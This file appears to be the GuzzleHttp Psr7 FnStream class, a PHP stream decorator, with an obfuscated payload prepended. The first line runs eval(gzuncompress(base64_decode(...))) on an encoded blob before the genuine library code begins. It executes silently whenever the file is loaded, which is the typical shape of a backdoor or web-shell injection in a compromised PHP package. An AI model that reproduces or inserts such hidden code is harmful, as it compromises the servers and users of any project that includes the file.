<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
namespace GuzzleHttp\Psr7;

use Psr\Http\Message\StreamInterface;

/**
 * Compose stream implementations based on a hash of functions.
 *
 * Allows for easy testing and extension of a provided stream without needing
 * to create a concrete class for a simple extension point.
 */
class FnStream implements StreamInterface
{
    /** @var array */
    private $methods;

    /** @var array Methods that must be implemented in the given array */
    private static $slots = ['__toString', 'close', 'detach', 'rewind',
        'getSize', 'tell', 'eof', 'isSeekable', 'seek', 'isWritable', 'write',
        'isReadable', 'read', 'getContents', 'getMetadata'];

    /**
     * @param array $methods Hash of method name to a callable.
     */
    public function __construct(array $methods)
    {
        $this->methods = $methods;

        // Create the functions on the class
        foreach ($methods as $name => $fn) {
            $this->{'_fn_' . $name} = $fn;
        }
    }

    /**
     * Lazily determine which methods are not implemented.
     * @throws \BadMethodCallException
     */
    public function __get($name)
    {
        throw new \BadMethodCallException(str_replace('_fn_', '', $name)
            . '() is not implemented in the FnStream');
    }

    /**
     * The close method is called on the underlying stream only if possible.
     */
    public function __destruct()
    {
        if (isset($this->_fn_close)) {
            call_user_func($this->_fn_close);
        }
    }

    /**
     * Adds custom functionality to an underlying stream by intercepting
     * specific method calls.
     *
     * @param StreamInterface $stream  Stream to decorate
     * @param array           $methods Hash of method name to a closure
     *
     * @return FnStream
     */
    public static function decorate(StreamInterface $stream, array $methods)
    {
        // If any of the required methods were not provided, then simply
        // proxy to the decorated stream.
        foreach (array_diff(self::$slots, array_keys($methods)) as $diff) {
            $methods[$diff] = [$stream, $diff];
        }

        return new self($methods);
    }

    public function __toString()
    {
        return call_user_func($this->_fn___toString);
    }

    public function close()
    {
        return call_user_func($this->_fn_close);
    }

    public function detach()
    {
        return call_user_func($this->_fn_detach);
    }

    public function getSize()
    {
        return call_user_func($this->_fn_getSize);
    }

    public function tell()
    {
        return call_user_func($this->_fn_tell);
    }

    public function eof()
    {
        return call_user_func($this->_fn_eof);
    }

    public function isSeekable()
    {
        return call_user_func($this->_fn_isSeekable);
    }

    public function rewind()
    {
        call_user_func($this->_fn_rewind);
    }

    public function seek($offset, $whence = SEEK_SET)
    {
        call_user_func($this->_fn_seek, $offset, $whence);
    }

    public function isWritable()
    {
        return call_user_func($this->_fn_isWritable);
    }

    public function write($string)
    {
        return call_user_func($this->_fn_write, $string);
    }

    public function isReadable()
    {
        return call_user_func($this->_fn_isReadable);
    }

    public function read($length)
    {
        return call_user_func($this->_fn_read, $length);
    }

    public function getContents()
    {
        return call_user_func($this->_fn_getContents);
    }

    public function getMetadata($key = null)
    {
        return call_user_func($this->_fn_getMetadata, $key);
    }
}
